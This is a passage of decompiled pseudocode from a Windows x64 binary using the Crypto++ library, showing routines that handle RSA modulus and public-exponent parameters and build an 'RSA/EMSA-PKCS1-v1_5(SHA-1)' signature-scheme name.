  if ( *((_BYTE *)v5 + 33) )
  {
    v7 = (__m128i *)v5[3];
    v8 = v7[1].m128i_i64[0];
    v9 = v7[1].m128i_u64[1];
    if ( v9 - v8 < 7 )
    {
      v7 = sub_13F107AD0(v7, 7ui64, 0i64, (const __m128i *)"Modulus", 7ui64);
    }
    else
    {
      v7[1].m128i_i64[0] = v8 + 7;
      v10 = v7;
      if ( v9 >= 0x10 )
        v10 = (__m128i *)v7->m128i_i64[0];
      v11 = &v10->m128i_i8[v8];
      sub_13F15EB00((__m128i *)((char *)v10 + v8), (const __m128i *)"Modulus", 7ui64);
      v11[7] = 0;
    }
    v12 = v7[1].m128i_i64[0];
    v13 = v7[1].m128i_u64[1];
    if ( v13 == v12 )
    {
      sub_13F107AD0(v7, 1ui64, 0i64, (const __m128i *)&qword_13F186BF0, 1ui64);
    }
    else
    {
      v7[1].m128i_i64[0] = v12 + 1;
      if ( v13 >= 0x10 )
        v7 = (__m128i *)v7->m128i_i64[0];
      v14 = &v7->m128i_i8[v12];
      sub_13F15EB00((__m128i *)((char *)v7 + v12), (const __m128i *)&qword_13F186BF0, 1ui64);
      v14[1] = 0;
    }
  }
  if ( !*((_BYTE *)v6 + 32) )
  {
    while ( 1 )
    {
      v15 = aModulus[v4++];
      if ( v15 != *(_BYTE *)(v6[1] + v4 - 1) )
        break;
      if ( v4 == 8 )
      {
        v16 = v6[2];
        if ( (unsigned int)sub_13F15E52C((__int64)&qword_13F1BF2C8, v16 + 8) )
        {
          sub_13F1053B0(v31, (const __m128i *)"Modulus");
          sub_13F101710((__int64)v32, v31, (__int64)&CryptoPP::Integer `RTTI Type Descriptor', v16);
          CxxThrowException(v32, (_ThrowInfo *)&_TI4_AVValueTypeMismatch_NameValuePairs_CryptoPP__);
        }
        v17 = sub_13F104200(*v6 + **(int **)(*v6 + 16));
        sub_13F113500(v6[3], v17);
        *((_BYTE *)v6 + 32) = 1;
        break;
      }
    }
  }
  if ( *((_BYTE *)v6 + 33) )
  {
    v18 = (__m128i *)v6[3];
    v19 = v18[1].m128i_i64[0];
    v20 = v18[1].m128i_u64[1];
    if ( v20 - v19 < 0xE )
    {
      v18 = sub_13F107AD0(v18, 0xEui64, 0i64, (const __m128i *)"PublicExponent", 0xEui64);
    }
    else
    {
      v18[1].m128i_i64[0] = v19 + 14;
      v21 = v18;
      if ( v20 >= 0x10 )
        v21 = (__m128i *)v18->m128i_i64[0];
      v22 = &v21->m128i_i8[v19];
      sub_13F15EB00((__m128i *)((char *)v21 + v19), (const __m128i *)"PublicExponent", 0xEui64);
      v22[14] = 0;
    }
    v23 = v18[1].m128i_i64[0];
    v24 = v18[1].m128i_u64[1];
    if ( v24 == v23 )
    {
      sub_13F107AD0(v18, 1ui64, 0i64, (const __m128i *)&qword_13F186BF0, 1ui64);
    }
    else
    {
      v18[1].m128i_i64[0] = v23 + 1;
      if ( v24 >= 0x10 )
        v18 = (__m128i *)v18->m128i_i64[0];
      v25 = &v18->m128i_i8[v23];
      sub_13F15EB00((__m128i *)((char *)v18 + v23), (const __m128i *)&qword_13F186BF0, 1ui64);
      v25[1] = 0;
    }
  }
  v26 = *((_BYTE *)v6 + 32);
  if ( !v26 && !(unsigned int)sub_13F16A230("PublicExponent", v6[1]) )
  {
    v27 = v6[2];
    if ( (unsigned int)sub_13F15E52C((__int64)&qword_13F1BF2C8, v27 + 8) )
    {
      sub_13F1053B0(v31, (const __m128i *)"PublicExponent");
      sub_13F101710((__int64)pExceptionObject, v31, (__int64)&CryptoPP::Integer `RTTI Type Descriptor', v27);
      CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVValueTypeMismatch_NameValuePairs_CryptoPP__);
    }
    v28 = sub_13F126500(*v6 + **(int **)(*v6 + 16));
    sub_13F113500(v6[3], v28);
    *((_BYTE *)v6 + 32) = 1;
    return 1;
  }
  return v26;
}
// 13F186BF0: using guessed type __int64 qword_13F186BF0;
// 13F1BF2C8: using guessed type __int64 qword_13F1BF2C8;
// 13F126EB0: using guessed type __int64 var_120[5];
// 13F126EB0: using guessed type __m128i var_F8[2];

//----- (000000013F127220) ----------------------------------------------------
void **__fastcall sub_13F127220(__int64 a1, __int64 a2, int a3, __int64 a4)
{
  char v8; // al
  __int64 v9; // rbx
  __int64 v10; // rax
  __int64 v11; // rdi
  __int64 v12; // rsi
  void (__fastcall ***v13)(_QWORD, __int64); // rcx
  void (__fastcall ***v14)(_QWORD, __int64); // rcx
  __int64 v15; // rbx
  char v16; // si
  __int64 v17; // rax
  __int64 v18; // rdi
  __int64 v19; // r14
  void (__fastcall ***v20)(_QWORD, __int64); // rcx
  void (__fastcall ***v21)(_QWORD, __int64); // rcx
  void **result; // rax
  unsigned __int64 v23; // rcx
  __int64 v24; // rdx
  unsigned __int64 v25; // rcx
  __int64 v26; // rdx
  void **v27; // [rsp+28h] [rbp-71h] BYREF
  void (__fastcall ***v28)(_QWORD, __int64); // [rsp+30h] [rbp-69h]
  void **v29; // [rsp+40h] [rbp-59h] BYREF
  void (__fastcall ***v30)(_QWORD, __int64); // [rsp+48h] [rbp-51h]
  char v31[16]; // [rsp+58h] [rbp-41h] BYREF
  unsigned __int64 v32; // [rsp+68h] [rbp-31h]
  unsigned __int64 v33; // [rsp+70h] [rbp-29h]
  void *v34; // [rsp+78h] [rbp-21h]
  char v35[16]; // [rsp+88h] [rbp-11h] BYREF
  unsigned __int64 v36; // [rsp+98h] [rbp-1h]
  unsigned __int64 v37; // [rsp+A0h] [rbp+7h]
  void *v38; // [rsp+A8h] [rbp+Fh]

  v8 = sub_13F11EB30(a4, 0i64);
  sub_13F112AD0((__int64)v35, v8 == 0);
  sub_13F120ED0(a4, (__int64)v31, (__int64)v35);
  v9 = sub_13F12AA90((__int64)&v27);
  v10 = sub_13F14059C(40i64);
  v11 = v10;
  if ( v10 )
  {
    *(_QWORD *)(v10 + 8) = "ModulusSize";
    *(_WORD *)(v10 + 16) = 1;
    *(_QWORD *)(v10 + 24) = 0i64;
    *(_QWORD *)v10 = off_13F183720;
    *(_DWORD *)(v10 + 32) = a3;
  }
  else
  {
    v11 = 0i64;
  }
  v12 = *(_QWORD *)(v9 + 8);
  *(_QWORD *)(v9 + 8) = 0i64;
  v13 = *(void (__fastcall ****)(_QWORD, __int64))(v11 + 24);
  if ( v13 )
    (**v13)(v13, 1i64);
  *(_QWORD *)(v11 + 24) = v12;
  v14 = *(void (__fastcall ****)(_QWORD, __int64))(v9 + 8);
  if ( v14 )
    (**v14)(v14, 1i64);
  *(_QWORD *)(v9 + 8) = v11;
  *(_BYTE *)(v9 + 16) = 1;
  v15 = sub_13F12AA30((__int64)&v29, v9);
  if ( v28 )
    (**v28)(v28, 1i64);
  v27 = &CryptoPP::NameValuePairs::`vftable';
  v16 = *(_BYTE *)(v15 + 16);
  v17 = sub_13F14059C(80i64);
  v18 = v17;
  if ( v17 )
  {
    *(_QWORD *)(v17 + 8) = "PublicExponent";
    *(_BYTE *)(v17 + 16) = v16;
    *(_BYTE *)(v17 + 17) = 0;
    *(_QWORD *)(v17 + 24) = 0i64;
    *(_QWORD *)v17 = &CryptoPP::AlgorithmParametersTemplate<CryptoPP::Integer>::`vftable';
    sub_13F112A00(v17 + 32, (__int64)v31);
  }
  else
  {
    v18 = 0i64;
  }
  v19 = *(_QWORD *)(v15 + 8);
  *(_QWORD *)(v15 + 8) = 0i64;
  v20 = *(void (__fastcall ****)(_QWORD, __int64))(v18 + 24);
  if ( v20 )
    (**v20)(v20, 1i64);
  *(_QWORD *)(v18 + 24) = v19;
  v21 = *(void (__fastcall ****)(_QWORD, __int64))(v15 + 8);
  if ( v21 )
    (**v21)(v21, 1i64);
  *(_QWORD *)(v15 + 8) = v18;
  *(_BYTE *)(v15 + 16) = v16;
  (**(void (__fastcall ***)(__int64, __int64, __int64))(a1 + 136))(a1 + 136, a2, v15);
  if ( v30 )
    (**v30)(v30, 1i64);
  result = &CryptoPP::NameValuePairs::`vftable';
  v29 = &CryptoPP::NameValuePairs::`vftable';
  v23 = v33;
  if ( v32 < v33 )
    v23 = v32;
  v24 = (__int64)v34;
  if ( v34 )
  {
    memset(v34, 0, 8 * v23);
    result = (void **)sub_13F12E4D0(v24);
  }
  v25 = v37;
  if ( v36 < v37 )
    v25 = v36;
  v26 = (__int64)v38;
  if ( v38 )
  {
    memset(v38, 0, 8 * v25);
    return (void **)sub_13F12E4D0(v26);
  }
  return result;
}
// 13F182E30: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 13F183720: using guessed type __int64 (__fastcall *off_13F183720[4])();
// 13F185A98: using guessed type void *CryptoPP::AlgorithmParametersTemplate<CryptoPP::Integer>::`vftable';

//----- (000000013F127480) ----------------------------------------------------
_BOOL8 __fastcall sub_13F127480(__int64 a1, __int64 a2)
{
  __int64 (__fastcall *(**v4)[4])(); // rax
  __int64 v5; // rdi
  __int64 (__fastcall *(**v6)[4])(); // rax
  bool v7; // bl
  unsigned __int64 v8; // rcx
  __int64 v9; // rdx
  unsigned __int64 v10; // rcx
  __int64 v11; // rdx
  char v13[16]; // [rsp+28h] [rbp-70h] BYREF
  unsigned __int64 v14; // [rsp+38h] [rbp-60h]
  unsigned __int64 v15; // [rsp+40h] [rbp-58h]
  void *v16; // [rsp+48h] [rbp-50h]
  char v17[16]; // [rsp+58h] [rbp-40h] BYREF
  unsigned __int64 v18; // [rsp+68h] [rbp-30h]
  unsigned __int64 v19; // [rsp+70h] [rbp-28h]
  void *v20; // [rsp+78h] [rbp-20h]

  v4 = sub_13F120160();
  sub_13F11FBB0(a2, (__int64)v13, (__int64)v4);
  v5 = sub_13F11D850((__int64)v17, a1 + 8, (__int64)v13);
  v6 = sub_13F120160();
  v7 = (unsigned int)sub_13F11C520(v5, (__int64)v6) == 0;
  v8 = v19;
  if ( v18 < v19 )
    v8 = v18;
  v9 = (__int64)v20;
  if ( v20 )
  {
    memset(v20, 0, 8 * v8);
    sub_13F12E4D0(v9);
  }
  v10 = v15;
  if ( v14 < v15 )
    v10 = v14;
  v11 = (__int64)v16;
  if ( v16 )
  {
    memset(v16, 0, 8 * v10);
    sub_13F12E4D0(v11);
  }
  return v7;
}
// 13F127480: using guessed type char var_40[16];

//----- (000000013F127550) ----------------------------------------------------
char __fastcall sub_13F127550(__int64 a1)
{
  __int64 v1; // rbx
  __int64 v2; // rax

  v1 = a1 + 16;
  v2 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 + 16) + 16i64))(a1 + 16);
  if ( !(*(unsigned __int8 (__fastcall **)(__int64))(*(_QWORD *)v2 + 16i64))(v2) )
    (*(void (__fastcall **)(__int64))(*(_QWORD *)v1 + 24i64))(v1);
  return 1;
}

//----- (000000013F127590) ----------------------------------------------------
char __fastcall sub_13F127590(__int64 a1)
{
  __int64 v1; // rbx
  __int64 v2; // rax

  v1 = a1 + 16;
  v2 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 + 16) + 16i64))(a1 + 16);
  if ( !(*(unsigned __int8 (__fastcall **)(__int64))(*(_QWORD *)v2 + 48i64))(v2) )
    (*(void (__fastcall **)(__int64))(*(_QWORD *)v1 + 24i64))(v1);
  return 1;
}

//----- (000000013F1275D0) ----------------------------------------------------
__int64 __fastcall sub_13F1275D0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v6; // r8
  unsigned __int64 v7; // rcx
  __int64 v8; // rdx
  unsigned __int64 v9; // rcx
  __int64 v10; // rdx
  char v12[16]; // [rsp+30h] [rbp-68h] BYREF
  unsigned __int64 v13; // [rsp+40h] [rbp-58h]
  unsigned __int64 v14; // [rsp+48h] [rbp-50h]
  void *v15; // [rsp+50h] [rbp-48h]
  __int64 v16; // [rsp+60h] [rbp-38h] BYREF
  unsigned __int64 v17; // [rsp+70h] [rbp-28h]
  unsigned __int64 v18; // [rsp+78h] [rbp-20h]
  void *v19; // [rsp+80h] [rbp-18h]

  v6 = sub_13F11D850((__int64)&v16, a2, a3);
  sub_13F11D2F0(a2, (__int64)v12, v6);
  sub_13F1234E0((__int64)v12, a1, a3);
  v7 = v14;
  if ( v13 < v14 )
    v7 = v13;
  v8 = (__int64)v15;
  if ( v15 )
  {
    memset(v15, 0, 8 * v7);
    sub_13F12E4D0(v8);
  }
  v9 = v18;
  if ( v17 < v18 )
    v9 = v17;
  v10 = (__int64)v19;
  if ( v19 )
  {
    memset(v19, 0, 8 * v9);
    sub_13F12E4D0(v10);
  }
  return a1;
}

//----- (000000013F1276B0) ----------------------------------------------------
__int64 __fastcall sub_13F1276B0(_QWORD *a1)
{
  __int64 *v2; // r15
  __int64 v3; // rax
  __int64 v4; // rax
  unsigned int v5; // eax
  unsigned int v6; // eax
  __int64 v7; // rbp
  unsigned __int64 v8; // rcx
  __int64 v9; // rdx
  __int64 v10; // rsi
  __int64 v11; // rbx
  __int64 v12; // rax
  char v14[16]; // [rsp+28h] [rbp-60h] BYREF
  char v15[16]; // [rsp+38h] [rbp-50h] BYREF
  unsigned __int64 v16; // [rsp+48h] [rbp-40h]
  unsigned __int64 v17; // [rsp+50h] [rbp-38h]
  void *v18; // [rsp+58h] [rbp-30h]

  v2 = (__int64 *)(*(__int64 (__fastcall **)(_QWORD *))(a1[2] + 24i64))(a1 + 2);
  v3 = (*(__int64 (__fastcall **)(_QWORD *))(a1[2] + 8i64))(a1 + 2);
  v4 = (*(__int64 (__fastcall **)(__int64, char *))(*(_QWORD *)v3 + 16i64))(v3, v15);
  v5 = sub_13F11BFE0(v4);
  if ( v5 <= 1 )
    v6 = 0;
  else
    v6 = v5 - 1;
  v7 = v6;
  v8 = v17;
  if ( v16 < v17 )
    v8 = v16;
  v9 = (__int64)v18;
  if ( v18 )
  {
    memset(v18, 0, 8 * v8);
    sub_13F12E4D0(v9);
  }
  v10 = *v2;
  v11 = (*(__int64 (__fastcall **)(_QWORD *))(*a1 + 128i64))(a1);
  v12 = (*(__int64 (__fastcall **)(_QWORD *, char *))(*a1 + 120i64))(a1, v14);
  return (*(__int64 (__fastcall **)(__int64 *, __int64, _QWORD, __int64, __int64))(v10 + 16))(
           v2,
           v7,
           *(unsigned int *)(v12 + 8),
           v11,
           -2i64);
}
// 13F1276B0: using guessed type char var_50[16];
// 13F1276B0: using guessed type char var_60[16];

//----- (000000013F127790) ----------------------------------------------------
__int64 __fastcall sub_13F127790(_QWORD *a1)
{
  __int64 *v2; // r15
  __int64 v3; // rax
  __int64 v4; // rax
  unsigned int v5; // eax
  unsigned int v6; // eax
  __int64 v7; // rbp
  unsigned __int64 v8; // rcx
  __int64 v9; // rdx
  __int64 v10; // rsi
  __int64 v11; // rbx
  __int64 v12; // rax
  char v14[16]; // [rsp+28h] [rbp-60h] BYREF
  char v15[16]; // [rsp+38h] [rbp-50h] BYREF
  unsigned __int64 v16; // [rsp+48h] [rbp-40h]
  unsigned __int64 v17; // [rsp+50h] [rbp-38h]
  void *v18; // [rsp+58h] [rbp-30h]

  v2 = (__int64 *)(*(__int64 (__fastcall **)(_QWORD *))(a1[2] + 24i64))(a1 + 2);
  v3 = (*(__int64 (__fastcall **)(_QWORD *))(a1[2] + 8i64))(a1 + 2);
  v4 = (*(__int64 (__fastcall **)(__int64, char *))(*(_QWORD *)v3 + 16i64))(v3, v15);
  v5 = sub_13F11BFE0(v4);
  if ( v5 <= 1 )
    v6 = 0;
  else
    v6 = v5 - 1;
  v7 = v6;
  v8 = v17;
  if ( v16 < v17 )
    v8 = v16;
  v9 = (__int64)v18;
  if ( v18 )
  {
    memset(v18, 0, 8 * v8);
    sub_13F12E4D0(v9);
  }
  v10 = *v2;
  v11 = (*(__int64 (__fastcall **)(_QWORD *))(*a1 + 144i64))(a1);
  v12 = (*(__int64 (__fastcall **)(_QWORD *, char *))(*a1 + 136i64))(a1, v14);
  return (*(__int64 (__fastcall **)(__int64 *, __int64, _QWORD, __int64, __int64))(v10 + 16))(
           v2,
           v7,
           *(unsigned int *)(v12 + 8),
           v11,
           -2i64);
}
// 13F127790: using guessed type char var_50[16];
// 13F127790: using guessed type char var_60[16];

//----- (000000013F127870) ----------------------------------------------------
__int64 __fastcall sub_13F127870(__int64 a1)
{
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 24i64))(a1);
}

//----- (000000013F127880) ----------------------------------------------------
__int64 __fastcall sub_13F127880(__int64 a1)
{
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 8i64))(a1);
}

//----- (000000013F127890) ----------------------------------------------------
__int64 __fastcall sub_13F127890(__int64 a1, __int64 a2, __int64 a3)
{
  return 8 * (a2 + a3) + 80;
}

//----- (000000013F1278A0) ----------------------------------------------------
__int64 __fastcall sub_13F1278A0(__int64 a1, _QWORD *a2)
{
  __int64 result; // rax

  sub_13F102D40((__int64)a2, a1);
  *a2 = &CryptoPP::AlgorithmParametersTemplate<CryptoPP::PrimeSelector const *>::`vftable';
  result = *(_QWORD *)(a1 + 32);
  a2[4] = result;
  return result;
}
// 13F186C30: using guessed type void *CryptoPP::AlgorithmParametersTemplate<CryptoPP::PrimeSelector const *>::`vftable';

//----- (000000013F1278E0) ----------------------------------------------------
__int64 sub_13F1278E0()
{
  __int64 v0; // rax

  v0 = sub_13F14059C(448i64);
  if ( v0 )
    return sub_13F1244C0(v0);
  else
    return 0i64;
}
// 13F1278E0: using guessed type __int64 __fastcall sub_13F1278E0();

//----- (000000013F127920) ----------------------------------------------------
__int64 sub_13F127920()
{
  __int64 v0; // rax

  v0 = sub_13F14059C(448i64);
  if ( v0 )
    return sub_13F1244C0(v0);
  else
    return 0i64;
}
// 13F127920: using guessed type __int64 __fastcall sub_13F127920();

//----- (000000013F127960) ----------------------------------------------------
__int64 __fastcall sub_13F127960(__int64 a1)
{
  __int64 v1; // rax

  v1 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 + 16) + 24i64))(a1 + 16);
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v1 + 24i64))(v1);
}

//----- (000000013F127980) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
_QWORD *sub_13F127980()
{
  int v0; // eax
  _QWORD *v1; // rbx
  int v2; // eax

  if ( *(int *)(*((_QWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + (unsigned int)TlsIndex) + 4i64) < 0 )
    sub_13F14045C(&dword_13F1C45C0);
  v0 = sub_13F10A240((__int64)qword_13F1C4570);
  if ( v0 )
    sub_13F109DF8(v0);
  v1 = (_QWORD *)sub_13F14059C(8i64);
  if ( v1 )
    *v1 = off_13F1861D8;
  else
    v1 = 0i64;
  qword_13F1C45C8 = (__int64)v1;
  v2 = sub_13F10A264((__int64)qword_13F1C4570);
  if ( v2 )
    sub_13F109DF8(v2);
  return v1;
}
// 13F127A0F: write access to const memory at 13F1C45C8 has been detected
// 13F1861D8: using guessed type __int64 (__fastcall *off_13F1861D8[10])();
// 13F1C4570: using guessed type __int64 qword_13F1C4570[10];
// 13F1C45C0: using guessed type int dword_13F1C45C0;
// 13F1C45C8: using guessed type __int64 qword_13F1C45C8;
// 13F1C5CF0: using guessed type int TlsIndex;

//----- (000000013F127A80) ----------------------------------------------------
__int64 __fastcall sub_13F127A80(__int64 a1)
{
  return (*(__int64 (__fastcall **)(__int64, _QWORD, _QWORD))(*(_QWORD *)a1 + 120i64))(a1, 0i64, 0i64);
}

//----- (000000013F127A90) ----------------------------------------------------
__int64 __fastcall sub_13F127A90(__int64 a1, __int64 a2)
{
  return sub_13F113500(a1 + 376, a2);
}

//----- (000000013F127AA0) ----------------------------------------------------
__int64 __fastcall sub_13F127AA0(__int64 a1, __int64 a2)
{
  return sub_13F113500(a1 + 424, a2);
}

//----- (000000013F127AB0) ----------------------------------------------------
__int64 __fastcall sub_13F127AB0(__int64 a1, __int64 a2)
{
  return sub_13F113500(a1 + 24, a2);
}

//----- (000000013F127AC0) ----------------------------------------------------
__int64 __fastcall sub_13F127AC0(__int64 a1, __int64 a2)
{
  return sub_13F113500(a1 + 472, a2);
}

//----- (000000013F127AD0) ----------------------------------------------------
__int64 __fastcall sub_13F127AD0(__int64 a1, __int64 a2)
{
  return sub_13F113500(a1 + 280, a2);
}

//----- (000000013F127AE0) ----------------------------------------------------
__int64 __fastcall sub_13F127AE0(__int64 a1, __int64 a2)
{
  return sub_13F113500(a1 + 328, a2);
}

//----- (000000013F127AF0) ----------------------------------------------------
__int64 __fastcall sub_13F127AF0(__int64 a1, __int64 a2)
{
  return sub_13F113500(a1 + 232, a2);
}

//----- (000000013F127B00) ----------------------------------------------------
__int64 __fastcall sub_13F127B00(__int64 a1, __int64 a2)
{
  return sub_13F113500(a1 + 72, a2);
}

//----- (000000013F127B10) ----------------------------------------------------
__int64 __fastcall sub_13F127B10(__int64 a1)
{
  __int64 v1; // rax
  __int64 v2; // rax
  __int64 v3; // rbx
  unsigned __int64 v4; // rcx
  __int64 v5; // rdx
  char v7[16]; // [rsp+28h] [rbp-40h] BYREF
  unsigned __int64 v8; // [rsp+38h] [rbp-30h]
  unsigned __int64 v9; // [rsp+40h] [rbp-28h]
  void *v10; // [rsp+48h] [rbp-20h]

  v1 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 + 16) + 8i64))(a1 + 16);
  v2 = (*(__int64 (__fastcall **)(__int64, char *))(*(_QWORD *)v1 + 24i64))(v1, v7);
  v3 = (unsigned int)sub_13F11C050(v2);
  v4 = v9;
  if ( v8 < v9 )
    v4 = v8;
  v5 = (__int64)v10;
  if ( v10 )
  {
    memset(v10, 0, 8 * v4);
    sub_13F12E4D0(v5);
  }
  return v3;
}
// 13F127B10: using guessed type char var_40[16];

//----- (000000013F127B80) ----------------------------------------------------
__m128i *__fastcall sub_13F127B80(__m128i *a1)
{
  __m128i v2; // kr00_16
  __m128i *v3; // rbx
  __m128i *v4; // rbx
  __m128i *v5; // rax
  __m128i v6; // kr10_16
  __m128i *v7; // rbx
  __m128i *v8; // rbx
  __m128i *v9; // rax
  __m128i v10; // kr20_16
  __m128i *v11; // rbx
  __m128i *v12; // rbx
  __m128i *v13; // rax
  __m128i v14; // kr30_16
  __m128i *v15; // rbx
  __m128i *v16; // rbx
  __m128i *v17; // rax
  __m128i v18; // kr40_16
  __m128i *v19; // rbx
  __m128i *v20; // rbx
  __m128i *v21; // rax
  __int64 v22; // rdx
  __int64 v23; // rcx
  __int64 v24; // rdx
  __int64 v25; // rcx
  __int64 v26; // rdx
  __int64 v27; // rcx
  __int64 v28; // rdx
  __int64 v29; // rcx
  __int64 v30; // rdx
  __int64 v31; // rcx
  __m128i v33; // [rsp+48h] [rbp-59h] BYREF
  __m128i v34; // [rsp+58h] [rbp-49h]
  __m128i v35; // [rsp+68h] [rbp-39h] BYREF
  __m128i v36; // [rsp+78h] [rbp-29h]
  __m128i v37; // [rsp+88h] [rbp-19h] BYREF
  __m128i v38; // [rsp+98h] [rbp-9h]
  __m128i v39; // [rsp+A8h] [rbp+7h] BYREF
  __m128i v40; // [rsp+B8h] [rbp+17h]
  __m128i v41; // [rsp+C8h] [rbp+27h] BYREF
  __m128i si128; // [rsp+D8h] [rbp+37h]

  si128 = _mm_load_si128((const __m128i *)&xmmword_13F19CCC0);
  v41.m128i_i8[0] = 0;
  sub_13F106C30(&v41, (const __m128i *)"RSA");
  v2 = si128;
  if ( si128.m128i_i64[1] == si128.m128i_i64[0] )
  {
    v5 = sub_13F107AD0(&v41, 1ui64, 0i64, (const __m128i *)"/", 1ui64);
  }
  else
  {
    ++si128.m128i_i64[0];
    v3 = &v41;
    if ( v2.m128i_i64[1] >= 0x10ui64 )
      v3 = (__m128i *)v41.m128i_i64[0];
    v4 = (__m128i *)((char *)v3 + v2.m128i_i64[0]);
    sub_13F15EB00(v4, (const __m128i *)"/", 1ui64);
    v4->m128i_i8[1] = 0;
    v5 = &v41;
  }
  v40 = 0i64;
  v39 = *v5;
  v40 = v5[1];
  v5[1].m128i_i64[0] = 0i64;
  v5[1].m128i_i64[1] = 15i64;
  v5->m128i_i8[0] = 0;
  v6 = v40;
  if ( v40.m128i_i64[1] - v40.m128i_i64[0] < 0xFui64 )
  {
    v9 = sub_13F107AD0(&v39, 0xFui64, 0i64, (const __m128i *)"EMSA-PKCS1-v1_5", 0xFui64);
  }
  else
  {
    v40.m128i_i64[0] += 15i64;
    v7 = &v39;
    if ( v6.m128i_i64[1] >= 0x10ui64 )
      v7 = (__m128i *)v39.m128i_i64[0];
    v8 = (__m128i *)((char *)v7 + v6.m128i_i64[0]);
    sub_13F15EB00(v8, (const __m128i *)"EMSA-PKCS1-v1_5", 0xFui64);
    v8->m128i_i8[15] = 0;
    v9 = &v39;
  }
  v38 = 0i64;
  v37 = *v9;
  v38 = v9[1];
  v9[1].m128i_i64[0] = 0i64;
  v9[1].m128i_i64[1] = 15i64;
  v9->m128i_i8[0] = 0;
  v10 = v38;
  if ( v38.m128i_i64[1] == v38.m128i_i64[0] )
  {
    v13 = sub_13F107AD0(&v37, 1ui64, 0i64, (const __m128i *)"(", 1ui64);
  }
  else
  {
    ++v38.m128i_i64[0];
    v11 = &v37;
    if ( v10.m128i_i64[1] >= 0x10ui64 )
      v11 = (__m128i *)v37.m128i_i64[0];
    v12 = (__m128i *)((char *)v11 + v10.m128i_i64[0]);
    sub_13F15EB00(v12, (const __m128i *)"(", 1ui64);
    v12->m128i_i8[1] = 0;
    v13 = &v37;
  }
  v36 = 0i64;
  v35 = *v13;
  v36 = v13[1];
  v13[1].m128i_i64[0] = 0i64;
  v13[1].m128i_i64[1] = 15i64;
  v13->m128i_i8[0] = 0;
  v14 = v36;
  if ( v36.m128i_i64[1] - v36.m128i_i64[0] < 5ui64 )
  {
    v17 = sub_13F107AD0(&v35, 5ui64, 0i64, (const __m128i *)"SHA-1", 5ui64);
  }
  else
  {
    v36.m128i_i64[0] += 5i64;
    v15 = &v35;
    if ( v14.m128i_i64[1] >= 0x10ui64 )
      v15 = (__m128i *)v35.m128i_i64[0];
    v16 = (__m128i *)((char *)v15 + v14.m128i_i64[0]);
    sub_13F15EB00(v16, (const __m128i *)"SHA-1", 5ui64);
    v16->m128i_i8[5] = 0;
    v17 = &v35;
  }
  v34 = 0i64;
  v33 = *v17;
  v34 = v17[1];
  v17[1].m128i_i64[0] = 0i64;
  v17[1].m128i_i64[1] = 15i64;
  v17->m128i_i8[0] = 0;
  v18 = v34;
  if ( v34.m128i_i64[1] == v34.m128i_i64[0] )
  {
    v21 = sub_13F107AD0(&v33, 1ui64, 0i64, (const __m128i *)")", 1ui64);
  }
  else
  {
    ++v34.m128i_i64[0];
    v19 = &v33;
    if ( v18.m128i_i64[1] >= 0x10ui64 )
      v19 = (__m128i *)v33.m128i_i64[0];
    v20 = (__m128i *)((char *)v19 + v18.m128i_i64[0]);
    sub_13F15EB00(v20, (const __m128i *)")", 1ui64);
    v20->m128i_i8[1] = 0;
    v21 = &v33;
  }
  a1[1].m128i_i64[0] = 0i64;
  a1[1].m128i_i64[1] = 0i64;
  *a1 = *v21;
  a1[1] = v21[1];
  v21[1].m128i_i64[0] = 0i64;
  v21[1].m128i_i64[1] = 15i64;
  v21->m128i_i8[0] = 0;
  if ( v34.m128i_i64[1] >= 0x10ui64 )
  {
    v22 = v34.m128i_i64[1] + 1;
    v23 = v33.m128i_i64[0];
    if ( (unsigned __int64)(v34.m128i_i64[1] + 1) >= 0x1000 )
    {
      v22 = v34.m128i_i64[1] + 40;
      v23 = *(_QWORD *)(v33.m128i_i64[0] - 8);
      if ( (unsigned __int64)(v33.m128i_i64[0] - v23 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v23, v22);
  }
  v34 = _mm_load_si128((const __m128i *)&xmmword_13F19CCC0);
  v33.m128i_i8[0] = 0;
  if ( v36.m128i_i64[1] >= 0x10ui64 )
  {
    v24 = v36.m128i_i64[1] + 1;
    v25 = v35.m128i_i64[0];
    if ( (unsigned __int64)(v36.m128i_i64[1] + 1) >= 0x1000 )
    {
      v24 = v36.m128i_i64[1] + 40;
      v25 = *(_QWORD *)(v35.m128i_i64[0] - 8);
      if ( (unsigned __int64)(v35.m128i_i64[0] - v25 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v25, v24);
  }
  v36 = _mm_load_si128((const __m128i *)&xmmword_13F19CCC0);
  v35.m128i_i8[0] = 0;
  if ( v38.m128i_i64[1] >= 0x10ui64 )
  {
    v26 = v38.m128i_i64[1] + 1;
    v27 = v37.m128i_i64[0];
    if ( (unsigned __int64)(v38.m128i_i64[1] + 1) >= 0x1000 )
    {
      v26 = v38.m128i_i64[1] + 40;
      v27 = *(_QWORD *)(v37.m128i_i64[0] - 8);
      if ( (unsigned __int64)(v37.m128i_i64[0] - v27 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v27, v26);
  }
  v38 = _mm_load_si128((const __m128i *)&xmmword_13F19CCC0);
  v37.m128i_i8[0] = 0;
  if ( v40.m128i_i64[1] >= 0x10ui64 )
  {
    v28 = v40.m128i_i64[1] + 1;
    v29 = v39.m128i_i64[0];
    if ( (unsigned __int64)(v40.m128i_i64[1] + 1) >= 0x1000 )
    {
      v28 = v40.m128i_i64[1] + 40;
      v29 = *(_QWORD *)(v39.m128i_i64[0] - 8);
      if ( (unsigned __int64)(v39.m128i_i64[0] - v29 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v29, v28);
  }
  v40 = _mm_load_si128((const __m128i *)&xmmword_13F19CCC0);
  v39.m128i_i8[0] = 0;
  if ( si128.m128i_i64[1] >= 0x10ui64 )
  {
    v30 = si128.m128i_i64[1] + 1;
    v31 = v41.m128i_i64[0];
    if ( (unsigned __int64)(si128.m128i_i64[1] + 1) >= 0x1000 )
    {
